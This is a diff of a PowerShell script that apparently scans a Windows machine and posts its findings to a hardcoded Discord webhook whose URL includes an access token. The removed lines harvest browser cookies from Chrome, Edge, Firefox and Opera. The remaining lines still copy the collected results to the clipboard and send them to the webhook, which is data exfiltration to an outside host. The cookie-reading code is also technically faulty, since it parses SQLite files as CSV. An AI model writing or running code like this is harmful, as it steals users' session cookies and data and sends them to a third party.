@@ -85,88 +85,6 @@ foreach ($path in $paths) {
     }
 }
 
-# Function to get cookies from Chrome
-function Get-ChromeCookies {
-    $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
-    if (Test-Path $path) {
-        $cookies = Import-Csv -Path $path -Delimiter '	' -Header @('Index','HostKey','Path','IsSecure','Expires_UTC','Name','Value','SameSite','Flags','LastAccess_UTC')
-        return $cookies
-    } else {
-        return $null
-    }
-}
-
-# Function to get cookies from Edge
-function Get-EdgeCookies {
-    $path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
-    if (Test-Path $path) {
-        $cookies = Import-Csv -Path $path -Delimiter '	' -Header @('Index','HostKey','Path','IsSecure','Expires_UTC','Name','Value','SameSite','Flags','LastAccess_UTC')
-        return $cookies
-    } else {
-        return $null
-    }
-}
-
-# Function to get cookies from Firefox
-function Get-FirefoxCookies {
-    $path = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    $profiles = Get-ChildItem -Path $path -Directory
-    foreach ($profile in $profiles) {
-        $cookiesPath = "$($profile.FullName)\cookies.sqlite"
-        if (Test-Path $cookiesPath) {
-            $cookies = Import-Csv -Path $cookiesPath -Delimiter '	' -Header @('Index','HostKey','Path','IsSecure','Expires_UTC','Name','Value','SameSite','Flags','LastAccess_UTC')
-            return $cookies
-        }
-    }
-    return $null
-}
-
-# Function to get cookies from Opera
-function Get-OperaCookies {
-    $path = "$env:APPDATA\Opera Software\Opera Stable\Cookies"
-    if (Test-Path $path) {
-        $cookies = Import-Csv -Path $path -Delimiter '	' -Header @('Index','HostKey','Path','IsSecure','Expires_UTC','Name','Value','SameSite','Flags','LastAccess_UTC')
-        return $cookies
-    } else {
-        return $null
-    }
-}
-
-# Get cookies from all browsers
-$chromeCookies = Get-ChromeCookies
-$edgeCookies = Get-EdgeCookies
-$firefoxCookies = Get-FirefoxCookies
-$operaCookies = Get-OperaCookies
-
-# Add cookies to results
-if ($chromeCookies) {
-    $Z += "`n--- Chrome Cookies ---`n"
-    $chromeCookies | ForEach-Object {
-        $Z += "Host: $($_.HostKey), Name: $($_.Name), Value: $($_.Value)"
-    }
-}
-
-if ($edgeCookies) {
-    $Z += "`n--- Edge Cookies ---`n"
-    $edgeCookies | ForEach-Object {
-        $Z += "Host: $($_.HostKey), Name: $($_.Name), Value: $($_.Value)"
-    }
-}
-
-if ($firefoxCookies) {
-    $Z += "`n--- Firefox Cookies ---`n"
-    $firefoxCookies | ForEach-Object {
-        $Z += "Host: $($_.HostKey), Name: $($_.Name), Value: $($_.Value)"
-    }
-}
-
-if ($operaCookies) {
-    $Z += "`n--- Opera Cookies ---`n"
-    $operaCookies | ForEach-Object {
-        $Z += "Host: $($_.HostKey), Name: $($_.Name), Value: $($_.Value)"
-    }
-}
-
 # Copy result to clipboard
 [System.Windows.Forms.Clipboard]::SetText($Z -join "`r`n")
 Write-Host "`nScan complete. Results copied to clipboard." -ForegroundColor Green
@@ -188,7 +106,8 @@ if (Test-Path $ubisoftPath) {
 
 # Send results to Discord webhook
 $webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrKmFiAmw7LdqjpWbWOGMValOwVICoB8Pc0tcpZFBnGhaVs4HH3ybjuadsi"
-$body = @{
+$payload = @{
     content = $Z -join "`r`n"
 }
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json"
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+Write-Host "Results sent to Discord webhook." -ForegroundColor Green
